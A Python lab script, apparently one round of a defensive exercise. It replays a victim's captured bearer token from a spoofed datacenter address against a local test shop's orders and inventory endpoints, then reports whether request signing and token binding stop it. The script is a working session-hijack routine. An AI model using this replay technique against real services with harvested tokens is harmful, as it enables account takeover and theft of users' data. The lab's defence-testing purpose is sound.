"""Round 5 attack — replay a harvested bearer token from another client.

A bearer token is a bearer instrument: hold it and you can use it. Here the
attacker has captured a victim's token (via the MitM of W3 Ch1, a leaked log, or
an infostealer) but *not* the per-session signing secret, which the first-party
client never transmits. The attacker replays the token from their datacenter
egress, unsigned, against the protected endpoints.

To obtain a token to replay, this script logs in once as the victim from a
"residential" browser egress — stand-in for the captured session — then throws
away the signing secret and replays only the token from the datacenter.

At DEFENSE_LEVEL<5 the replay reads the victim's orders and the true inventory.
At DEFENSE_LEVEL=5 request signing rejects the unsigned call (401 on orders) and
token binding flags the client change; the inventory endpoint deceives the bot
with poisoned numbers instead of revealing the block.
"""

from __future__ import annotations

import httpx

from _common import BASE_URL, DATACENTER_IP, headers, require_local_target

ACTOR = "bot-r5"
VICTIM = {"email": "victim@example.com", "password": "Hunter2day!"}
RESIDENTIAL_IP = "198.51.100.23"


def capture_token(base: str) -> str:
    """Stand-in for token harvesting: obtain the victim's token (secret discarded)."""
    h = headers("victim-session", egress_ip=RESIDENTIAL_IP,
                ua="Mozilla/5.0 (Windows NT 10.0) Chrome/141.0")
    with httpx.Client(base_url=base, headers=h, timeout=10) as c:
        r = c.post("/api/v2/auth/login", json=VICTIM)
        r.raise_for_status()
        return r.json()["access_token"]  # note: api_secret deliberately NOT kept


def run(base: str = BASE_URL) -> dict:
    require_local_target(base)
    token = capture_token(base)
    # Replay from the attacker's datacenter egress, unsigned.
    h = headers(ACTOR, egress_ip=DATACENTER_IP, extra={"Authorization": f"Bearer {token}"})
    with httpx.Client(base_url=base, headers=h, timeout=10) as c:
        ro = c.get("/api/v2/account/orders")
        orders_ok = ro.status_code == 200
        orders = ro.json().get("orders", []) if orders_ok else []
        ri = c.get("/api/v2/inventory/lab-runner-9")
        inv = ri.json().get("item", {}) if ri.status_code == 200 else {}
        deceived = ri.json().get("deceived", False) if ri.status_code == 200 else False
    return {"actor": ACTOR, "orders_read": orders_ok, "orders_count": len(orders),
            "inventory_price": inv.get("price"), "deceived": deceived,
            "orders_status": ro.status_code}


if __name__ == "__main__":
    s = run()
    if not s["orders_read"]:
        tail = " (inventory poisoned)" if s["deceived"] else ""
        print(f"[round5] replay BLOCKED: orders {s['orders_status']}{tail}")
    else:
        print(f"[round5] replay succeeded: read {s['orders_count']} victim orders, "
              f"inventory price {s['inventory_price']}")
